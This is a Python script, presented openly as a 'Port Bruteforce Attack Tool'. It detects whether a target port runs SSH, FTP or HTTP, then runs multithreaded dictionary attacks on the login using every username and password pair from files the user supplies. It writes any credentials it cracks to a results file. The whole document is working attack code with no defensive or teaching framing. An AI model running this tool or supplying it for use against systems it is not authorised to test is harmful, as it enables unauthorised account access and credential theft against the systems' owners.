import socket
import threading
import paramiko  # For SSH brute force
import ftplib  # For FTP brute force
import requests  # For HTTP brute force
from queue import Queue
import time
import os

# Configuration
THREADS = 10  # Number of threads for brute force
TIMEOUT = 3  # Connection timeout in seconds


class BruteforceAttack:
    def __init__(self, target_ip, port):
        self.target_ip = target_ip
        self.port = port
        self.found_credentials = []
        self.queue = Queue()
        self.protocol = self.detect_protocol()

    def detect_protocol(self):
        """Detect the protocol running on the port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((self.target_ip, self.port))

            # Try to get banner
            try:
                banner = sock.recv(1024).decode().strip().lower()
                if 'ssh' in banner:
                    return 'ssh'
                elif 'ftp' in banner:
                    return 'ftp'
                elif 'http' in banner or 'html' in banner:
                    return 'http'
            except:
                pass

            # Common port numbers
            if self.port == 22:
                return 'ssh'
            elif self.port == 21:
                return 'ftp'
            elif self.port == 80 or self.port == 443:
                return 'http'

            return 'unknown'
        except:
            return 'unknown'
        finally:
            sock.close()

    def load_credentials(self, username_file=None, password_file=None):
        """Load credentials from user-specified files"""
        usernames = []
        passwords = []

        if username_file and os.path.exists(username_file):
            try:
                with open(username_file, 'r', errors='ignore') as f:
                    usernames = [line.strip() for line in f.readlines() if line.strip()]
            except Exception as e:
                print(f"[!] Error reading username file: {e}")
        else:
            print(f"[!] Username file not found: {username_file}")
            return False

        if password_file and os.path.exists(password_file):
            try:
                with open(password_file, 'r', errors='ignore') as f:
                    passwords = [line.strip() for line in f.readlines() if line.strip()]
            except Exception as e:
                print(f"[!] Error reading password file: {e}")
        else:
            print(f"[!] Password file not found: {password_file}")
            return False

        if not usernames or not passwords:
            print("[!] No valid usernames or passwords found in the provided files")
            return False

        # Add all combinations to queue
        for user in usernames:
            for pwd in passwords:
                self.queue.put((user, pwd))

        print(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
        print(f"[+] Total combinations to try: {len(usernames) * len(passwords)}")
        return True

    def brute_ssh(self):
        """Brute force SSH service"""
        while not self.queue.empty() and not self.found_credentials:
            user, pwd = self.queue.get()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.target_ip, port=self.port, username=user, password=pwd, timeout=TIMEOUT)
                print(f"[+] SSH Success: {user}:{pwd}")
                self.found_credentials.append(f"SSH - {user}:{pwd}")
                ssh.close()
                return  # Stop after first success
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"[!] SSH Error: {e}")
            finally:
                self.queue.task_done()

    def brute_ftp(self):
        """Brute force FTP service"""
        while not self.queue.empty() and not self.found_credentials:
            user, pwd = self.queue.get()
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.target_ip, self.port, timeout=TIMEOUT)
                ftp.login(user=user, passwd=pwd)
                print(f"[+] FTP Success: {user}:{pwd}")
                self.found_credentials.append(f"FTP - {user}:{pwd}")
                ftp.quit()
                return  # Stop after first success
            except ftplib.error_perm:
                pass
            except Exception as e:
                print(f"[!] FTP Error: {e}")
            finally:
                self.queue.task_done()

    def brute_http_basic_auth(self):
        """Brute force HTTP Basic Authentication"""
        while not self.queue.empty() and not self.found_credentials:
            user, pwd = self.queue.get()
            try:
                url = f"http://{self.target_ip}:{self.port}"
                response = requests.get(url, auth=(user, pwd), timeout=TIMEOUT)
                if response.status_code == 200:
                    print(f"[+] HTTP Basic Auth Success: {user}:{pwd}")
                    self.found_credentials.append(f"HTTP Basic Auth - {user}:{pwd}")
                    return  # Stop after first success
            except Exception as e:
                print(f"[!] HTTP Error: {e}")
            finally:
                self.queue.task_done()

    def run_attack(self, username_file, password_file):
        """Run the brute force attack"""
        print(f"\n[+] Starting brute force attack on {self.target_ip}:{self.port}")
        print(f"[+] Protocol detected: {self.protocol.upper() if self.protocol != 'unknown' else 'Unknown'}")

        if not self.load_credentials(username_file, password_file):
            return

        # Create and start threads
        threads = []
        for _ in range(THREADS):
            if self.protocol == 'ssh':
                t = threading.Thread(target=self.brute_ssh)
            elif self.protocol == 'ftp':
                t = threading.Thread(target=self.brute_ftp)
            elif self.protocol == 'http':
                t = threading.Thread(target=self.brute_http_basic_auth)
            else:
                print(f"[!] Unsupported protocol on port {self.port}")
                return

            t.start()
            threads.append(t)

        # Wait for all threads to complete
        for t in threads:
            t.join()

        if not self.found_credentials:
            print(f"[-] No valid credentials found for {self.target_ip}:{self.port}")


def get_file_input(prompt):
    """Helper function to get valid file path from user"""
    while True:
        file_path = input(prompt).strip()
        if os.path.exists(file_path):
            return file_path
        print(f"[!] File not found: {file_path}")
        print("Please enter a valid file path or press Ctrl+C to exit")


def main():
    print("Port Bruteforce Attack Tool")
    print("--------------------------\n")

    try:
        target_ip = input("Enter target IP address: ").strip()
        ports_input = input("Enter ports to attack (comma separated, e.g., 21,22,80): ").strip()
        ports = [int(p.strip()) for p in ports_input.split(',')]

        print("\n[+] Please provide dictionary files:")
        username_file = get_file_input("Path to username dictionary file: ")
        password_file = get_file_input("Path to password dictionary file: ")

        print("\n[+] Starting attacks...")

        results = []
        for port in ports:
            attack = BruteforceAttack(target_ip, port)
            attack.run_attack(username_file, password_file)
            if attack.found_credentials:
                results.append(f"Port {port} ({attack.protocol}): {attack.found_credentials[0]}")

        print("\n[+] Attack results:")
        if results:
            for result in results:
                print(f"  - {result}")

            # Save results to file
            with open("bruteforce_results.txt", "w") as f:
                f.write("Bruteforce Attack Results\n")
                f.write(f"Target: {target_ip}\n")
                f.write(f"Date: {time.ctime()}\n")
                f.write(f"Username file: {username_file}\n")
                f.write(f"Password file: {password_file}\n\n")
                for result in results:
                    f.write(f"{result}\n")
            print("\nResults saved to 'bruteforce_results.txt'")
        else:
            print("  - No successful attacks")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()